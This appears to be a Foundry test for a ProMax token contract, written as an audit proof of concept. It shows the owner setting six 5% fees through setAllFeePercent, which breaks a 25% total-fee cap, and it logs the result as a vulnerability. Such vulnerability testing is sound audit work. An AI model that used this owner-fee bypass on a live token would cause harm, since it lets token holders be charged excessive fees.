// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ProMax.sol";

contract ProMaxFeeTest is Test {
    ProMax token;
    address owner = address(0x123);
    address routerAddr = address(0xABCD);
    address factoryAddr = address(0xCDEF);
    address ethRecipient = address(0x999);
    uint256 constant MAX_TOTAL_FEE = 25;

    function setUp() public {
        // Mock router factory call
        vm.mockCall(
            routerAddr,
            abi.encodeWithSelector(bytes4(keccak256("factory()"))),
            abi.encode(factoryAddr)
        );

        // Mock router WETH call
        vm.mockCall(
            routerAddr,
            abi.encodeWithSelector(bytes4(keccak256("WETH()"))),
            abi.encode(address(0xC02))
        );

        // Mock factory createPair - match any parameters
        vm.mockCall(
            factoryAddr,
            abi.encodeWithSelector(bytes4(keccak256("createPair(address,address)"))),
            abi.encode(address(0))
        );

        // Define constructor parameters
        string memory name = "TestToken";
        string memory symbol = "TST";
        uint8 decimals = 18;
        uint256 totalSupply = 1_000_000 * (10 ** decimals);
        uint16 txPercent = 500; // 5%
        uint16 walletPercent = 500; // 5%
        
        ProMax.FeeWallet memory walletConfig = ProMax.FeeWallet(
            payable(address(0xFEE)),
            payable(address(0xFEE)),
            true,
            true
        );
        
        address rewardToken = address(0xDEF);
        uint256 minBalance = 1 ether;
        ProMax.Fee memory initialFees = ProMax.Fee(0, 0, 0, 0, 0, 0, 0);
        address[] memory addrs = new address[](2);
        addrs[0] = routerAddr;
        addrs[1] = ethRecipient; // Use known payable address

        // Deploy token with owner funds
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
        token = new ProMax{value: 1 ether}(
            name,
            symbol,
            decimals,
            totalSupply,
            txPercent,
            walletPercent,
            walletConfig,
            rewardToken,
            minBalance,
            initialFees,
            addrs
        );
        vm.stopPrank();
    }
    
    // Necessary to receive ETH transfers
    receive() external payable {}

    function test_owner_can_exceed_max_total_fees() public {
        console.log("--- BEFORE-Trigger Fee State ---");
        // Query all fee parameters before the attack
        uint256 taxFeeBefore = token._taxFee();
        uint256 liquidityFeeBefore = token._liquidityFee();
        uint256 burnFeeBefore = token._burnFee();
        uint256 walletFeeBefore = token._walletFee();
        uint256 buybackFeeBefore = token._buybackFee();
        uint256 walletCharityFeeBefore = token._walletCharityFee();
        
        // Calculate total fee before set
        uint256 totalFeeBefore = taxFeeBefore + liquidityFeeBefore + burnFeeBefore + 
                               walletFeeBefore + buybackFeeBefore + walletCharityFeeBefore;
        
        console.log("Pre-Trigger Total Fee: %d", totalFeeBefore);
        console.log("Pre-Trigger Tax Fee: %d", taxFeeBefore);
        console.log("Pre-Trigger Liquidity Fee: %d", liquidityFeeBefore);
        console.log("Pre-Trigger Burn Fee: %d", burnFeeBefore);
        console.log("Pre-Trigger Wallet Fee: %d", walletFeeBefore);
        console.log("Pre-Trigger Buyback Fee: %d", buybackFeeBefore);
        console.log("Pre-Trigger Charity Fee: %d", walletCharityFeeBefore);

        console.log("\n--- Trigger SetAllFeePercent ---");
        vm.startPrank(owner);
        // Set fees to exceed 25% total - 5% for each of 6 fees = 30%
        token.setAllFeePercent(5, 5, 5, 5, 5, 5, 0);
        vm.stopPrank();

        console.log("\n--- AFTER-Trigger Fee State ---");
        // Query all fee parameters after the attack
        uint256 taxFeeAfter = token._taxFee();
        uint256 liquidityFeeAfter = token._liquidityFee();
        uint256 burnFeeAfter = token._burnFee();
        uint256 walletFeeAfter = token._walletFee();
        uint256 buybackFeeAfter = token._buybackFee();
        uint256 walletCharityFeeAfter = token._walletCharityFee();
        
        // Calculate total fee after set
        uint256 totalFeeAfter = taxFeeAfter + liquidityFeeAfter + burnFeeAfter + 
                              walletFeeAfter + buybackFeeAfter + walletCharityFeeAfter;
                                 
        console.log("Post-Trigger Total Fee: %d", totalFeeAfter);
        console.log("Post-Trigger Tax Fee: %d", taxFeeAfter);
        console.log("Post-Trigger Liquidity Fee: %d", liquidityFeeAfter);
        console.log("Post-Trigger Burn Fee: %d", burnFeeAfter);
        console.log("Post-Trigger Wallet Fee: %d", walletFeeAfter);
        console.log("Post-Trigger Buyback Fee: %d", buybackFeeAfter);
        console.log("Post-Trigger Charity Fee: %d", walletCharityFeeAfter);

        console.log("\n--- Fee Comparison Result ---");
        bool feeChanged = totalFeeAfter != totalFeeBefore;
        bool feeLimitViolated = totalFeeAfter > MAX_TOTAL_FEE;
        console.log("Fee Change Detected: %s", feeChanged ? "YES" : "NO");
        console.log("Max Fee Violation: %s", feeLimitViolated ? "YES" : "NO");
        
        // Final verdict based on MAX_TOTAL_FEE violation
        if (feeLimitViolated) {
            console.log("\nVulnerability Exists: Owner successfully set fees beyond 25%% limit");
        } else {
            console.log("\nVulnerability not Exist: Fee limit enforcement works correctly");
        }

        // Original test assertion
        assertGt(totalFeeAfter, MAX_TOTAL_FEE, "Fees exceed maximum safe limit (25%)");
    }
}